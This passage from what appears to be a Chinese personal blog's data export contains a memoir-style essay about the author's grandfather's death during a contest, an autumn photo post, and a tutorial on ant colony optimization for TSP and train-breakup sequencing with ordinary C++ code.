，偷偷溜了出来，留下老妈在店里和店员讨价还价。不一会儿，妈妈满意的提着衣服出来，前往姥爷家探望。一路都在夸耀这件衣服多么的好，给儿子买件好看的衣服，真心心花怒放，喜笑颜开。</p>\n<p>“昨天还能睁开眼来着，今天怎么不睁眼了？”老妈神态急迫得很，看着床上没力气睁眼的姥爷着急无奈。</p>\n<p>“是啊是啊，”大姨表示很无辜，轻拍姥爷的脸：“你外孙子来看你了！睁眼看看啊！”</p>\n<p>许久，无果。依旧是微闭的双眼，张着嘴喘气，像一条缺氧的大鱼。</p>\n<p>“没事吧！”大姨动手翻开姥爷的眼皮，摸摸脑门，“今天怎么眼都睁不开了呢，量量体温快！”对着姥爷大喊：“你外孙子回来啦！睁眼看看！”依旧没有任何反应。只是喘气显得更加疲惫了。</p>\n<p>老娘看了我一眼：“这都睁不开眼了，你也帮不上什么忙了，该忙你的忙你的吧，我和你大姨看着你姥爷好了。”</p>\n<p>若是转身就走，向来也不太合常理。在姥爷的病榻旁默立一会，微感无聊，看看老妈面对姥爷发烧各种着急的样子，想来也只能帮倒忙，只好默默地离开了。</p>\n<p>回到家，盯着电脑发呆。从小父母都忙，可以说记忆最深的都是在姥姥家长大的。作为为数不多的常驻劳动力，每天放学后，经常要完成的任务就是和表弟晓宇一起浇花。看着满院子的花花草草，那可都是姥姥的心肝宝贝啊，绝对不能怠慢！我和小表弟皱着眉头一盆盆的浇好，心里还默默地数着，“这个倒半瓢，这个是小半瓢，那个最大，需要倒一桶！”如此养的一院子的花花</p>\n<p>草草郁郁葱葱，生活虽然略显窘迫，倒也开心快乐。如此养了好多年，黄秋子树要砍掉了，南边的院子要盖楼了，满院子的花花草草无处安放，只好卖掉。姥爷趁着身体有力，推出板车，放好一盆盆各色各样的花，略微颤抖的推到街上。那时候的我跟在他后边，看着他跟买家讨价还价，“这可不能卖，这么多年了长得这么好，这点钱怎么卖！”买家一个个的离开了，好几天也卖不出去几盆花。都是曾经辛辛苦苦养出来的啊，怎么舍得就这么简单的卖掉了！眼看天色已黑，姥爷依旧是略微颤抖的推回板车，安放好一盆盆的花花草草，钻进屋子忙起家里的活。。。</p>\n<p>“你姥爷的情况真的是不好啊”，老妈回来了，“十来天前就坐不起来了，但是像今天这样还是第一次啊。”我走到妈妈的屋子，无言以对。难道能说是因为我回来的原因，冥冥之中自有天意么？无奈中只好唯唯诺诺：“人老了嘛，免不了生个病什么的，过几天就好了。”话虽然这么说，但是心里总还是没底的。依稀想起姥姥去世的时候，我好像也是这么说的，心里不由得一阵寒冷，转身离开，钻到自己屋子里，打开电脑，胡乱的翻着各种网页。心里默默的想着，希望姥爷能好起来。</p>\n<p>“看这样子你也帮不上什么忙了，不是要做你的数学建模吗，好好的做吧，家里的事情我来看着好了。”想想也是，于是撺掇撺掇队友，开始准备数学建模的事情。打算2号回学校，全力准备。</p>\n<p>“2号就要走么，大年初三是吧，那要赶紧把家里的那些好东西给你煮了。晓宇他妈给拿过来这么多虾，给你煎了吃了吧。”每次放假都是如此，从半年前上次放假就开始攒下来的好吃的，就等这次放假我回来煮给我吃。因此老妈的厨艺依旧糟糕，各种保鲜技术倒是长进了不少。盛情难却，各种鸡鸭鱼肉一起招呼，直希望我一天能把半年的东西都吃回来。满腹油水的离开家乡。</p>\n<p>要说回家了吧，时间过的就是快。转眼春节到了，大年初一走亲访友，姥爷依旧是无意识不睁眼状态。想来以前过年的时候，姥爷总是颤颤巍巍地从兜里拿出一张毛爷爷当做压岁钱给我们这些小辈，换来的也仅仅是一句看似普通的“姥爷过年好！”，和姥爷脸上憨憨的笑容。今年虽然压岁钱没少，送出来的人确是大姨。换来的是一个无奈的笑容和一个充满祥和的安慰。一起吃团圆饭，少了一个老人，少了一份祥和。</p>\n<p>匆匆忙忙的回到学校，迎来的无非是一个个疲惫的白天和一个个不安的夜晚。为了出国为了一个小小的奖，大过年的离开家乡，确是令人不爽。反思上大学以来，似乎每个假期都没有在家里度过过。不是这个集训，就是那个比赛。学术水平难以恭维不说，和家里人在一起的时间才是少了又少。心里暗自苦笑一番，这么苦到底是为了什么。看看人人上大家都在秀各种玩各种吃的照片，想想前几天英语班上认识的某位同学应该还在福州玩的痛快，心里不由得百感交集。生来劳碌，无可抱怨。</p>\n<p>在学校准备的日子一天天过去，就像恐怖游轮一样无聊永恒的循环。直到今天，蹲在厕所里边刷微博，看到了表弟的微博：</p>\n<p>真希望能像弟弟一样，什么都不懂，这样会免去很多痛苦吧。。。不过爸爸说的没错，爷爷能活88岁高龄，陪大家过了春节，临终前和家里儿孙也都见面了，没病没灾，儿女孝顺，死的时候也没有任何痛苦，对于全家人来说也许都应该为爷爷感到高兴吧，不说了，早点休息，接下来几天还有很多事要做的</p>\n<p>说实话，当时心里第一感觉是。。没感觉。只是想，临终前大家都在姥爷身边，而我不在，实在是太遗憾了。然后匆匆忙忙离开厕所，给老妈打电话，听着老妈忍着哭腔装作没事一样的语句，我才真切的感觉到一丝的悲痛。“你不用回来了，回来也帮不上什么忙，好好做你的比赛。等你弄完了再回来。”“我当然还是要回去的，这么大的事，我和队友商量商量”“你回来干嘛啊，用不到你，我们这些人忙活就好了”。。</p>\n<p>是啊，老妈说的所有的话，似乎只有一句，就是“这里用不到你，忙活你的就好了”。我还能说什么呢。二十多年了，他们似乎所有的事情都是在为我减轻负担。尤其是最近几年，上了大学之后，听到最多的或许就是“你干什么自己决定吧，我已经不知道你在干什么了。想清楚了做就是了，需要钱就跟我说，肯定够你花的。”早就习惯了生活的我，也只好说，“好吧，我弄完了马上回去”</p>\n<p>挂了电话，真的感觉我做的是什么事情啊！这些奖项，这些学习，真的有这么重要么？上大学这么长时间了，失去了这么多，我究竟得到了什么。这么做意义何在啊！大过年的，本来应该是在家好好陪陪父母，聊聊天的日子，却又有各种比赛，各种集训。仔细算算，究竟还有多长时间是能够陪在父母身边的呢。**基地不说，就是单独的竞赛，也会在过年早早的驱动起忙碌的我们，投入到无休无止的学习，工作中去。这样做，真的好吗？</p>\n<p>话虽如此，到了这一步，还是要继续的学习下去。依旧忙碌的学习，忙碌的准备。就像表弟的微博一样：</p>\n<p>爷爷过年该见的人都见了，就像我爸说的，儿女孝顺，自己也没受啥罪，活这么大岁数，也值得为爷爷高兴了，还是那句话，爷爷奶奶一辈子以这一家子大学生为骄傲，你安心学你的，拿个好成绩比你回来磕个头更能让爷爷欣慰，好好比赛</p>\n<p>很多时候吧，他比我更懂事。确实，作为一个家族来说，最大的快乐莫过于家族的后代都能够发展壮大。到这里了，还能在说什么呢。生活就是一个圈子，就算是看懂了，也无法逃脱。能做的只能是就着大家的期待，努力满足大家的期望。姥爷去世了，甚至应该是高兴的。为了姥爷一生行善的善终，为了姥爷能够和姥姥冥间继续厮守。无奈的我们，知道就着眼下的路子，无法回头的走下去。</p>"},{"title":"秋","date":"2014-11-01T10:59:59.000Z","_content":"![](http://ww1.sinaimg.cn/mw1024/aa74c538jw1elvbblfefaj21kw0w01bj.jpg)\n<!--more-->\n![](http://ww1.sinaimg.cn/large/aa74c538jw1elvbb2hie6j21kw0w04hf.jpg)\n似乎一夜之间，树叶竟然完全黄了啊！北京又降温了，冷风刺骨。照顾好自己~~\n![](http://ww3.sinaimg.cn/large/aa74c538jw1elvbbec1ajj21kw2t41ky.jpg)\n![](http://ww1.sinaimg.cn/large/aa74c538jw1elvbblfefaj21kw0w01bj.jpg)\n真后悔当时没有好好拍,现在也提不起兴致再去了~~","source":"_posts/U79cb.md","raw":"title: 秋\ndate: 2014-11-01 10:59:59\ntags:\ncategories: Picture\n---\n![](http://ww1.sinaimg.cn/mw1024/aa74c538jw1elvbblfefaj21kw0w01bj.jpg)\n<!--more-->\n![](http://ww1.sinaimg.cn/large/aa74c538jw1elvbb2hie6j21kw0w04hf.jpg)\n似乎一夜之间，树叶竟然完全黄了啊！北京又降温了，冷风刺骨。照顾好自己~~\n![](http://ww3.sinaimg.cn/large/aa74c538jw1elvbbec1ajj21kw2t41ky.jpg)\n![](http://ww1.sinaimg.cn/large/aa74c538jw1elvbblfefaj21kw0w01bj.jpg)\n真后悔当时没有好好拍,现在也提不起兴致再去了~~","slug":"U79cb","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vh0029wypdg57pqvcv","content":"<p><img src=\"http://ww1.sinaimg.cn/mw1024/aa74c538jw1elvbblfefaj21kw0w01bj.jpg\" alt=\"\"><br><a id=\"more\"></a><br><img src=\"http://ww1.sinaimg.cn/large/aa74c538jw1elvbb2hie6j21kw0w04hf.jpg\" alt=\"\"><br>似乎一夜之间，树叶竟然完全黄了啊！北京又降温了，冷风刺骨。照顾好自己~~<br><img src=\"http://ww3.sinaimg.cn/large/aa74c538jw1elvbbec1ajj21kw2t41ky.jpg\" alt=\"\"><br><img src=\"http://ww1.sinaimg.cn/large/aa74c538jw1elvbblfefaj21kw0w01bj.jpg\" alt=\"\"><br>真后悔当时没有好好拍,现在也提不起兴致再去了~~</p>\n","excerpt":"<p><img src=\"http://ww1.sinaimg.cn/mw1024/aa74c538jw1elvbblfefaj21kw0w01bj.jpg\" alt=\"\"><br>","more":"<br><img src=\"http://ww1.sinaimg.cn/large/aa74c538jw1elvbb2hie6j21kw0w04hf.jpg\" alt=\"\"><br>似乎一夜之间，树叶竟然完全黄了啊！北京又降温了，冷风刺骨。照顾好自己~~<br><img src=\"http://ww3.sinaimg.cn/large/aa74c538jw1elvbbec1ajj21kw2t41ky.jpg\" alt=\"\"><br><img src=\"http://ww1.sinaimg.cn/large/aa74c538jw1elvbblfefaj21kw0w01bj.jpg\" alt=\"\"><br>真后悔当时没有好好拍,现在也提不起兴致再去了~~</p>"},{"title":"蚁群算法及其在列车解体顺序编排的应用","date":"2015-02-23T23:36:00.000Z","_content":"##基本原理的了解##\n首先我们来说一下蚁群算法。在看本文之前，大家需要先看一下百度百科关于蚁群算法的初步讲解。真正的蚁群算法和自然界的蚂蚁寻找食物是有很大差异的。但是了解大自然蚂蚁的寻找规律是很有必要的。\n<!--more-->\n##蚁群算法和大自然蚂蚁寻找食物的区别##\n大自然中，蚂蚁在寻找食物的时候，会留下自己的信息素。同时每个蚂蚁个体更倾向于朝着信息素更加浓的方向走（这是一个概率问题，越浓的方向被选择的概率越大）。同时由于两点之间，一定的时间内越短的道路通过的蚂蚁越多，所以越短的道路留下的信息素也越多。直到最后这个信息素浓度特别的浓，大家走有极大地概率往这个方向走。\n![](/image/20150223234503.png)\n上边这张图来自于百度百科。我想说明的一点是，蚂蚁并不知道自己走过的路程是短还是长（我了解这一点也是通过我的女票囧）。他们只需要按照信息素的浓度找吃的就可以了。因为如上图，最开始的时候，两边一样多的信息素浓度。但是A侧更短，所以A侧的会先到达目的地。因此一定时间内能够通过的蚂蚁更多。所以信息素浓度就大。\n但是我们设计的蚁群算法不是这样的。我们是根据不同蚂蚁走过的道路的距离来决定信息素的多少的。这只蚂蚁走过的总路程最短，那么它释放的信息素就更多。我们只能通过距离的长短来设计信息素的多少，而不是通过蚂蚁先后到达来体现信息素。\n##蚁群算法的基本流程##\n总体来说每一轮蚁群算法的迭代有这么几步：\n###放置蚂蚁###\n以TSP（货郎担问题）为例，我们会在多个城市中随机放置蚂蚁。来作为整个程序的开始。\n###选择概率的更新###\n对于每一只蚂蚁的当前位置，我们需要根据信息素浓度来判定下一个城市的选择概率，然后根据概率进行下一个城市的选择。这里大有文章可做，我们可以结合信息素浓度，以及自己设计的各种启发函数，来确定下一个城市的选择概率。\n###下一个城市的选择###\n对于每一只蚂蚁，我们可以根据上一步的概率来选择下一个城市。同时进行操作，诸如已选城市标记，选择好的数据处理等等。\n###信息素的更新###\n这一步是在所有的蚂蚁完成该轮循环之后做的事情。我们对于每只旅行完毕的蚂蚁的每一段旅程进行信息素更新。更新的依据就是它走过的路程长短。这里把路程长短转化为信息素浓度也是需要设计。常用的有基于平均数的设计（短于平均长度的路程信息素加一些，长于平均长度的蚂蚁对应的路程信息素减一些）。对于经过的每一段旅程进行更新完毕之后，城市两两之间的选择信息素浓度就有了。\n##货郎担问题的基本实现##\n首先由几点要说一下：\n###关于$\\rho$这个元素###\n我们知道，如果信息素不耗散，会有什么后果呢。理论一点的说就是算法收敛速度过快，陷入局部最优解中。为什么会出现这种现象呢。是因为为了让更多的蚂蚁去有更大的概率选择一些新的道路，或者说让最近的一次迭代起到的作用更大，我们需要削弱以前几次迭代的结果。这个在大自然中表现为蚂蚁留下的信息素会不断的被风吹走，我们在算法中呢，也就是代码中的rou，就是用来形容以前的信息素信息被吹走的。看看代码就可以了。\n###关于代码中详细的表示###\n本人不敢妄加修改代码，只好大体说一下各个函数以及变量的意义。\n首先ant类是用来表示每只蚂蚁的行动的。函数名称对照我上边所说的几个过程就可以看懂了。\nproject类是用来描述整个的算法进程的。也是很容易明白。会点c++语言的基本都能看懂。\n具体的Q啦，alpha啦，这些都是具体算法设计的内容。我没有作TSP的相关研究。这些都是可以自己设计的。我就暂且不说了。\n###代码###\n代码在最后边放着。我先说列车解体问题的具体应用了。\n##列车解题顺序编排的应用##\n这个问题大体来说是这样的。我们知道我们做的火车是由很多车节组成的。每个出发列车的车节都是由到达列车拆分然后组装出来的。所以我们要解决的问题就是，如果每个时间只能有一辆列车被拆分，在每个出发列车时间确定的情况下，怎样的拆分顺序是能够弄出更多的出发列车呢。\n\n具体来说，每个到达列车有a,b,c,d四个方向不同的车节，每个出发列车也有四个方向车节的要求。同时每个到达列车有自己的解体时间，出发列车组装也需要时间。具体如下表：\n![](/image/20150224.png)\n\n因为如果我们需要对每个到达列车进行顺序编排的话，就有n!种排序方式。这个很明显是NP完全问题了。用蚁群算法优化一下或许是一个不错的选择。\n\n首先我们是需要把所有列车都解体的。只不过是顺序问题。所以我们就映射到了TSP问题当中，TSP需要走遍所有的城市，只不过是顺序问题罢了。\n接下来我们可以用出发列车作为时间限制进行优化，比方说第一个出发列车，在这个列车出发前，我们有几辆列车已经到位了，所以这个时候在第一辆发车之前，我们只能选择已经到达的这几辆列车解体。凑够第一辆出发列车之后，我们在考虑第二辆列车。这样的话我们就缩小了搜索范围，提升了效率。\n我们需要给每个蚂蚁设计一个时间戳，描述当前这只蚂蚁走到了什么时间。如果超过了当前列车出发时间还没有凑齐，那么这只蚂蚁就废了。success这个元素就标记成0.\n每次添加城市（也就是具体问题中的选择新的列车），我们都要在这个蚂蚁的时间戳上更新时间。如果是很早以前就到了的列车，我们加上解体时间就好，如果是还没到的列车，我们需要等列车到了，再加上解体时间。然后在蚂蚁的列车库中先添加这个解体列车的列车节数，然后检查是不是凑够了当前出发列车需要的节数。如果凑够了就在蚂蚁车库中去除列车节数，否则就继续。\n程序员都知道，当然这个列车问题有很多其他的设计细节，细节决定成败。详细说清楚的话很费力。有兴趣的看看代码，不懂再联系。\n\n##代码部分##\n###传统TSP###\n这个代码是直接从网上粘过来的。来自于fashionxu.blogchina.com\n这个代码是我自己调试通过了的。有什么疑问留言就好。\n\n\n```\n#include <stdio.h>\n#include <iostream>\n#include <fstream>\n#include <math.h>\n#include <stdlib.h>\n#include <time.h>\nusing namespace std;\n\n\nconst int iAntCount=10;//ant numbers\nconst int iCityCount=48;\nconst int iItCount=5000;\nconst double Q=100;\nconst double alpha=3.0;\nconst double beta=5.0;\nconst double rou=0.9;\nconst double rain=0.022;\nconst double q0=0.3;\nint besttour[iCityCount+1];\n\ndouble  rnd(int low,int uper)\n{\n\tdouble p=(rand()/(double)RAND_MAX)*((uper)-(low))+(low);1;\n\treturn (p);\n};\nint rnd(int uper)\n{\n\treturn (rand()%uper);\n};\nstruct GInfo\n{\n\tdouble m_dDeltTrial[iCityCount][iCityCount];\n\tdouble m_dTrial[iCityCount][iCityCount];\n\tdouble distance[iCityCount][iCityCount];\n}Map;\nclass ant\n{\nprivate:\n\tdouble prob[iCityCount];\n\tint m_iTopCity;\n\tint allowed[iCityCount];\n\n\tint ChooseNextCity();\n\n\tvoid UpdateProb();\npublic:\n\n\tdouble m_dLength;\n\n\tint visited[iCityCount+1];\n\n\tant();\n\tvoid addcity(int city);\n\tvoid Clear();\n\tvoid UpdateLength();\n\tvoid move();\n\n\t//void move2last();\n};\n\nant::ant()\n{\n\tm_dLength=0;\n\tm_iTopCity=0;\n\tint i;\n\tfor(i=0;i<iCityCount;i++)\n\t{\n\t\tprob[i]=0.5;\n\t\tallowed[i]=1;\n\t}\n}\nvoid ant::addcity(int city)\n{//add city to tabu;\n\tvisited[m_iTopCity]=city;\n\tm_iTopCity++;\n\tallowed[city]=0;\n}\nvoid ant::UpdateProb()\n{\n\tint i;\n\tdouble temp=0;\n\tint curCity=visited[m_iTopCity-1];\n\tint c=0;\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tif(allowed[i])\n\t\t{\n\t\t\tdouble p=pow((1.0/Map.distance[curCity][i]),beta)*pow((Map.m_dTrial[curCity][i]),alpha);\n\t\t\ttemp+=p;\n\t\t\tc++;\n\t\t}\n\t}\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tif(allowed[i])\n\t\t{\n\t\t\tif (temp==0)\n\t\t\t\tprob[i]=(double)1.0/(double)c;\n\t\t\telse\n\t\t\t\tprob[i]=pow((1.0/Map.distance[curCity][i]),beta)*pow((Map.m_dTrial[curCity][i]),alpha)/temp;\n\t\t}\n\t\telse\n\t\t\tprob[i]=0;\n\t}\n}\nint ant::ChooseNextCity()\n{//Update the probability of path selection\n\t//select a path from tabu[m_iCityCount-1] to next\n\tint i,j;\n\tdouble temp;\n\tdouble mRate=rnd(0,1);\n\tint curCity=visited[m_iTopCity-1];\n\n\tUpdateProb();\n\tif (mRate>q0)\n\t{\n\t\ttemp=-1;\n\t\tfor (i=0;i<iCityCount;i++)\n\t\t{\n\t\t\t//temp<prob[i];\n\t\t\tif(allowed[i])\n\t\t\t{\n\t\t\t\tdouble p=pow((1.0/Map.distance[curCity][i]),beta)*pow((Map.m_dTrial[curCity][i]),alpha);\n\t\t\t\tif (temp<p)\n\t\t\t\t{\n\t\t\t\t\ttemp=p;\n\t\t\t\t\tj=i;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tdouble mSelect=0;\n\t\tfor (int i=0;i<iCityCount;i++)\n\t\t{\n\t\t\tmSelect+=prob[i] ;\n\t\t\tif (mSelect>=mRate) {j=i;break;}\n\t\t}\n\t}\n\treturn j;\n}\nvoid ant::UpdateLength()\n{// Update the length of tour\n\tint i;\n\tfor(i=0;i<iCityCount;i++)\n\t\tm_dLength+=Map.distance[visited[i]][visited[i+1]];\n}\nvoid ant::move()\n{//the ant move to next town and add town ID to tabu.\n\tint j;\n\tj=ChooseNextCity();\n\taddcity(j);\n}\nvoid ant::Clear()\n{\n\tm_dLength=0;\n\tint i;\n\tfor(i=0;i<iCityCount;i++)\n\t{\n\t\tprob[i]=0.5;\n\t\tallowed[i]=1;\n\t}\n\ti=visited[0];\n\tm_iTopCity=0;\n\taddcity(i);\n}\nclass project\n{\n\tvoid initmap();\n\npublic:\n\n\tdouble m_dShortest;\n\tant ants[iAntCount];\n\n\tvoid UpdateTrial();\n\tvoid GetAnt();\n\tvoid StartSearch();\n\tproject();\n};\n\nproject::project()\n{//initial map,read map infomation from file . et.\n\n\tstruct city\n\t{\n\n\t\tint x;\n\t\tint  y;\n\t}cc[iCityCount];\n\tint num;\n\tint i;\n\n\tinitmap();\n\n\tm_dShortest=10e9;\n\n\n\tifstream in(\"48.txt\");\n\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tin>>num>>cc[i].x>>cc[i].y;\n\t\tbesttour[i]=0;\n\t}\n\tint j;\n\tfor(i=0;i<iCityCount;i++)\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t\tMap.distance[i][j]=sqrt(pow((cc[i].x-cc[j].x),2)+pow((cc[i].y-cc[j].y),2));\n}\nvoid project::initmap()\n{\n\tint i;\n\tint j;\n\tfor(i=0;i<iCityCount;i++)\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\tMap.m_dTrial[i][j]=1.0/(double)iCityCount;\n\t\t\tMap.m_dDeltTrial[i][j]=0;\n\t\t}\n}\nvoid project::GetAnt()\n{//randomly put ant into map\n\tint i=0;\n\tint city;\n\tsrand( (unsigned)time( NULL ) +rand());\n\tfor (i=0;i<iAntCount;i++)\n\t{\n\t\tcity=rnd(iCityCount);\n\t\tants[i].addcity(city);\n\t}\n}\nvoid project::StartSearch()\n{//begin to find best solution\n\tint max=0;//every ant tours times\n\tint i;\n\tint j;\n\tdouble temp;\n\tint temptour[iCityCount+1];\n\twhile (max<iItCount)\n\t{\n\t\tfor (i=0;i<iCityCount-1;i++)\n\t\t\tfor(j=0;j<iAntCount;j++)\n\t\t\t\tants[j].move();\n\n\t\tfor(j=0;j<iAntCount;j++)\n\t\t{\n\t\t\tants[j].visited[iCityCount]=ants[j].visited[0];\n\t\t\tants[j].UpdateLength ();\n\t\t}\n\n\t\t//find out the best solution of the step and put it into temp\n\t\tint t;\n\t\ttemp=ants[0].m_dLength ;\n\t\tfor (t=0;t<iCityCount+1;t++)\n\t\t\ttemptour[t]=ants[0].visited[t];\n\t\tfor(j=0;j<iAntCount;j++)\n\t\t{\n\t\t\tif (temp>ants[j].m_dLength) {\n\t\t\t\ttemp=ants[j].m_dLength;\n\t\t\t\tfor ( t=0;t<iCityCount+1;t++)\n\t\t\t\t\ttemptour[t]=ants[j].visited[t];\n\t\t\t}\n\t\t}\n\n\t\tif(temp<m_dShortest){\n\t\t\tm_dShortest=temp;\n\t\t\tprintf(\"%d : %f\\n\",max,m_dShortest);\n\t\t\tfor ( t=0;t<iCityCount+1;t++)\n\t\t\t\tbesttour[t]=temptour[t];\n\t\t}\n\t\tif (max %100==0)printf(\" %d \",max);\n\t\tUpdateTrial();\n\n\t\tfor(j=0;j<iAntCount;j++)\n\t\t\tants[j].Clear();\n\n\t\tmax++;\n\t\t//char c;\n\t\t//scanf(\"%c\",&c);\n\t}\n\tprintf(\"The shortest toure is : %f\\n\",m_dShortest);\n\n\tfor ( int t=0;t<=iCityCount;t++)\n\t\tprintf(\" %d \",besttour[t]);\n\n}\nvoid project::UpdateTrial()\n{//calculate the changes of trial information\n\tint i;\n\tint j;\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\t//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);\n\t\t\tMap.m_dTrial[i][j]*=(1-rou);//*Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );\n\t\t\t//Map.m_dProb[i][j]=\n\t\t\t//Map.m_dDeltTrial[i][j]=0;\n\t\t}\n\t}\n\tfor(i=0;i<iAntCount;i++)\n\t{\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\tMap.m_dDeltTrial[ants[i].visited[j]][ants[i].visited[j+1]]+=Q/ants[i].m_dLength ;\n\t\t\tMap.m_dDeltTrial[ants[i].visited[j+1]][ants[i].visited[j]]+=Q/ants[i].m_dLength;\n\t\t}\n\t}\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\t//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);\n\t\t\tMap.m_dTrial[i][j]=rou*(Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );\n\t\t\t//Map.m_dProb[i][j]=\n\t\t\tMap.m_dDeltTrial[i][j]=0;\n\t\t}\n\t}\n}\nint main()\n{\n\tproject TSP;\n\tTSP.GetAnt();\n\tTSP.StartSearch();\n\tchar c;\n\tscanf(\"%c\",&c);\n\treturn 0;}\n\n```\n输入文件叫做“48.txt”，格式如下\n[48.txt](/other/48.txt)\n\n###列车解体问题###\n输入文件格式如下：\n首先是到达列车的数量，然后分别写出每个列车的信息\n然后是出发列车的数量，然后写出每个列车的信息\n[aco_input.txt](/other/aco_input.txt)","source":"_posts/U8681U7fa4U7b97U6cd5U53caU5176U5728U5217U8f66U89e3U4f53U987aU5e8fU7f16U6392U7684U5e94U7528.md","raw":"title: 蚁群算法及其在列车解体顺序编排的应用\ndate: 2015-02-23 23:36:00\ntags: Algorithm\ncategories: Algorithm\n---\n##基本原理的了解##\n首先我们来说一下蚁群算法。在看本文之前，大家需要先看一下百度百科关于蚁群算法的初步讲解。真正的蚁群算法和自然界的蚂蚁寻找食物是有很大差异的。但是了解大自然蚂蚁的寻找规律是很有必要的。\n<!--more-->\n##蚁群算法和大自然蚂蚁寻找食物的区别##\n大自然中，蚂蚁在寻找食物的时候，会留下自己的信息素。同时每个蚂蚁个体更倾向于朝着信息素更加浓的方向走（这是一个概率问题，越浓的方向被选择的概率越大）。同时由于两点之间，一定的时间内越短的道路通过的蚂蚁越多，所以越短的道路留下的信息素也越多。直到最后这个信息素浓度特别的浓，大家走有极大地概率往这个方向走。\n![](/image/20150223234503.png)\n上边这张图来自于百度百科。我想说明的一点是，蚂蚁并不知道自己走过的路程是短还是长（我了解这一点也是通过我的女票囧）。他们只需要按照信息素的浓度找吃的就可以了。因为如上图，最开始的时候，两边一样多的信息素浓度。但是A侧更短，所以A侧的会先到达目的地。因此一定时间内能够通过的蚂蚁更多。所以信息素浓度就大。\n但是我们设计的蚁群算法不是这样的。我们是根据不同蚂蚁走过的道路的距离来决定信息素的多少的。这只蚂蚁走过的总路程最短，那么它释放的信息素就更多。我们只能通过距离的长短来设计信息素的多少，而不是通过蚂蚁先后到达来体现信息素。\n##蚁群算法的基本流程##\n总体来说每一轮蚁群算法的迭代有这么几步：\n###放置蚂蚁###\n以TSP（货郎担问题）为例，我们会在多个城市中随机放置蚂蚁。来作为整个程序的开始。\n###选择概率的更新###\n对于每一只蚂蚁的当前位置，我们需要根据信息素浓度来判定下一个城市的选择概率，然后根据概率进行下一个城市的选择。这里大有文章可做，我们可以结合信息素浓度，以及自己设计的各种启发函数，来确定下一个城市的选择概率。\n###下一个城市的选择###\n对于每一只蚂蚁，我们可以根据上一步的概率来选择下一个城市。同时进行操作，诸如已选城市标记，选择好的数据处理等等。\n###信息素的更新###\n这一步是在所有的蚂蚁完成该轮循环之后做的事情。我们对于每只旅行完毕的蚂蚁的每一段旅程进行信息素更新。更新的依据就是它走过的路程长短。这里把路程长短转化为信息素浓度也是需要设计。常用的有基于平均数的设计（短于平均长度的路程信息素加一些，长于平均长度的蚂蚁对应的路程信息素减一些）。对于经过的每一段旅程进行更新完毕之后，城市两两之间的选择信息素浓度就有了。\n##货郎担问题的基本实现##\n首先由几点要说一下：\n###关于$\\rho$这个元素###\n我们知道，如果信息素不耗散，会有什么后果呢。理论一点的说就是算法收敛速度过快，陷入局部最优解中。为什么会出现这种现象呢。是因为为了让更多的蚂蚁去有更大的概率选择一些新的道路，或者说让最近的一次迭代起到的作用更大，我们需要削弱以前几次迭代的结果。这个在大自然中表现为蚂蚁留下的信息素会不断的被风吹走，我们在算法中呢，也就是代码中的rou，就是用来形容以前的信息素信息被吹走的。看看代码就可以了。\n###关于代码中详细的表示###\n本人不敢妄加修改代码，只好大体说一下各个函数以及变量的意义。\n首先ant类是用来表示每只蚂蚁的行动的。函数名称对照我上边所说的几个过程就可以看懂了。\nproject类是用来描述整个的算法进程的。也是很容易明白。会点c++语言的基本都能看懂。\n具体的Q啦，alpha啦，这些都是具体算法设计的内容。我没有作TSP的相关研究。这些都是可以自己设计的。我就暂且不说了。\n###代码###\n代码在最后边放着。我先说列车解体问题的具体应用了。\n##列车解题顺序编排的应用##\n这个问题大体来说是这样的。我们知道我们做的火车是由很多车节组成的。每个出发列车的车节都是由到达列车拆分然后组装出来的。所以我们要解决的问题就是，如果每个时间只能有一辆列车被拆分，在每个出发列车时间确定的情况下，怎样的拆分顺序是能够弄出更多的出发列车呢。\n\n具体来说，每个到达列车有a,b,c,d四个方向不同的车节，每个出发列车也有四个方向车节的要求。同时每个到达列车有自己的解体时间，出发列车组装也需要时间。具体如下表：\n![](/image/20150224.png)\n\n因为如果我们需要对每个到达列车进行顺序编排的话，就有n!种排序方式。这个很明显是NP完全问题了。用蚁群算法优化一下或许是一个不错的选择。\n\n首先我们是需要把所有列车都解体的。只不过是顺序问题。所以我们就映射到了TSP问题当中，TSP需要走遍所有的城市，只不过是顺序问题罢了。\n接下来我们可以用出发列车作为时间限制进行优化，比方说第一个出发列车，在这个列车出发前，我们有几辆列车已经到位了，所以这个时候在第一辆发车之前，我们只能选择已经到达的这几辆列车解体。凑够第一辆出发列车之后，我们在考虑第二辆列车。这样的话我们就缩小了搜索范围，提升了效率。\n我们需要给每个蚂蚁设计一个时间戳，描述当前这只蚂蚁走到了什么时间。如果超过了当前列车出发时间还没有凑齐，那么这只蚂蚁就废了。success这个元素就标记成0.\n每次添加城市（也就是具体问题中的选择新的列车），我们都要在这个蚂蚁的时间戳上更新时间。如果是很早以前就到了的列车，我们加上解体时间就好，如果是还没到的列车，我们需要等列车到了，再加上解体时间。然后在蚂蚁的列车库中先添加这个解体列车的列车节数，然后检查是不是凑够了当前出发列车需要的节数。如果凑够了就在蚂蚁车库中去除列车节数，否则就继续。\n程序员都知道，当然这个列车问题有很多其他的设计细节，细节决定成败。详细说清楚的话很费力。有兴趣的看看代码，不懂再联系。\n\n##代码部分##\n###传统TSP###\n这个代码是直接从网上粘过来的。来自于fashionxu.blogchina.com\n这个代码是我自己调试通过了的。有什么疑问留言就好。\n\n\n```\n#include <stdio.h>\n#include <iostream>\n#include <fstream>\n#include <math.h>\n#include <stdlib.h>\n#include <time.h>\nusing namespace std;\n\n\nconst int iAntCount=10;//ant numbers\nconst int 